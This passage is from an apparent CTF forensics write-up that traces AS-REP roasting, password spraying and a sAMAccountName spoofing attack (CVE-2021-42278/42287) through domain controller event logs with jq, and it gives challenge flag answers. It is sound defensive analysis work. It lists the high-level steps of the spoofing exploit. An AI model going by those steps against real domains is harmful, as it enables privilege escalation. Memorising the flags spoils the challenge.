$ jq '.|select(.RuleTitle=="Kerberos TGT Requested")|select(.ExtraFieldInfo.TicketEncryptionType=="0x17")' dc02alltimeline.json | less -S
{
  "Timestamp": "2024-07-19 15:01:52.406 +03:00",
  "RuleTitle": "Kerberos TGT Requested",
  "Level": "info",
  "Computer": "winterfell.north.sevenkingdoms.local",
  "Channel": "Sec",
  "EventID": 4768,
  "RecordID": 131061,
  "Details": {
    "TgtUser": "brandon.stark",
    "Svc": "krbtgt",
    "SrcIP": "::ffff:172.16.10.109",
    "Status": "0x0",
    "PreAuthType": 0
  }
}
```

Then the attacker tried to crack the target user password and he successed as we saw he made a successful logon with `brandon.stark` user `Q7:EGCERT{brandon.stark,2024:07:19 12:01:52}`

There was an alert called "Suspicious Kerberos RC4 Ticket Encryption" that if I noticed earlier would made solving the previous question easier. Even it is confirmed that the user `brandon.stark` was targeted with ASREProasting, it still weird why the attacker was able to logon with multiple account, I searched for events in the same time window of the attacker successful logon and found this alert:

```bash
Timestamp": "2024-07-19 15:02:26.837 +03:00",
  "RuleTitle": "Failed Logins with Different Accounts from Single Source System",
  "Level": "med",
  "Computer": "-",
  "Channel": "-",
  "EventID": "-",
  "RecordID": "",
  "Details": "[condition] count(TargetUserName) by WorkstationName > 3 [result] count:4 TargetUserName:jeor.mormont/sql_svc/samwell.tarly/jon.snow WorkstationName:-"
  ```
So may be the attacker was trying the cracked password with different accounts and two of them had the same password.


Now moving to the next question, it ask about the created sAMAccountName and the CVE that lead to some goal. I started by searching for sAMAccountName and why the attacker would need that or what he could achieve from doing that, I found this great article that talks about `sAMAccountName spoofing` attack and how they got exploited by `CVE-2021–42278` and `CVE-2021–42287`.

The steps of this exploit is:
1. a new computer is added (computer name has the $ in the end)
2. Rename the computer to match the DC name
3. Obtain a TGT
4. Reset the computer name back to the original name
5. Obtain a service ticket with S4U2self by presenting the previous TGT

I will try to detect this behaviour from the logs. First lets find the event of new computer is added:

```bash
$ jq '.|select(.RuleTitle=="Add or Remove Computer from DC")|{Timestamp,Computer,SamAccountName:.ExtraFieldInfo.SamAccountName}' dc02alltimeline.json | less -S
{
  "Timestamp": "2024-07-15 15:45:35.323 +03:00",
  "Computer": "winterfell",
  "SamAccountName": "SEVENKINGDOMS$"
}
{
  "Timestamp": "2024-07-15 15:47:29.217 +03:00",
  "Computer": "winterfell.north.sevenkingdoms.local",
  "SamAccountName": "WINTERFELL$"
}
{
  "Timestamp": "2024-07-15 15:57:35.637 +03:00",
  "Computer": "winterfell.north.sevenkingdoms.local",
  "SamAccountName": "SEVENKINGDOMS$"
}
{
  "Timestamp": "2024-07-15 15:59:37.671 +03:00",
  "Computer": "winterfell.north.sevenkingdoms.local",
  "SamAccountName": "CASTELBLACK$"
}
{
  "Timestamp": "2024-07-24 13:13:02.898 +03:00",
  "Computer": "winterfell.north.sevenkingdoms.local",
  "SamAccountName": "winterfall$"
}
```

The first four entries seem legit as when the machines in the domain was created, also their timestamps are way before the first appearance of the attacker in the network. The last entry is inside the attack time window, also the created SamAccountName is intended to look like winterfell but actually its a typo (winterfall). Now I will search in `dc02alltimeline.json` in the minutes after the SamAccountName creation. I will selectively show some interesting events:

```bash
{
  "Timestamp": "2024-07-24 13:17:36.171 +03:00",
  "RuleTitle": "Suspicious Computer Account Name Change CVE-2021-42287",
  "Channel": "Sec",
  "EventID": 4781,
  "Details": {
    "OldTgtUser": "winterfall$",
    "NewTgtUser": "winterfell",
  }
}
{
  "Timestamp": "2024-07-24 13:18:15.246 +03:00",
  "RuleTitle": "Kerberos TGT Requested",
  "Channel": "Sec",
  "EventID": 4768,
  "Details": {
    "TgtUser": "winterfell",
    "Svc": "krbtgt",
    "SrcIP": "::ffff:172.16.10.109",
  }
}
{
  "Timestamp": "2024-07-24 13:18:39.530 +03:00",
  "RuleTitle": "New or Renamed User Account with '$' Character",
  "Channel": "Sec",
  "EventID": 4781,
  "Details": {
    "OldTgtUser": "winterfell",
    "NewTgtUser": "winterfall$",
  }
}
```

The previous four events corresponding to the last 4 steps of the sAMAccountName spoofing attack, the computer name is renamed to match the DC (winterfall$>winterfell), a TGT Requested, reset the computer name back to the original name.
```bash
Q12:EGCERT{winterfall$}
Q13:EGCERT{CVE-2021-42287}
```

سبحان الله وبحمده.
سبحان الله العظيم.


See you in another CTF👋


![](/assets/images/posts/2024-08-01-icmtcFinals/secn00bs.jpg)






